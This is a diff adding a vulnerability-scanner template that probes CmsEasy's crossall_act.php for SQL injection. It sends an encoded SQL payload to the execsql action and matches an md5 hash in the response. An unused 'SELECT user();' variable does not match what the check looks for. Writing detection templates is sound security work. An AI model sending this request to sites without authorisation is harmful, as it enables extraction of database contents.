@@ -1,0 +1,30 @@
+id: cmseasy-crossall-sqli
+
+info:
+  name: CmsEasy crossall_act.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    CmsEasy is a PHP and MySQL-based website content management system. A SQL injection vulnerability exists in crossall_act.php, allowing attackers to extract sensitive database information.
+  tags: sqli
+  reference:
+    - https://xz.aliyun.com/t/10259
+
+variables:
+  sqlQuery: "SELECT user();"
+  encodedSql: '{{url_encode(concat("C", "ErNh-zvuuqcC4IXHJ0eGlln"))}}'
+
+http:
+  - raw:
+      - |
+        GET /?case=crossall&act=execsql&sql={{encodedSql}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+          - "md5(123)"
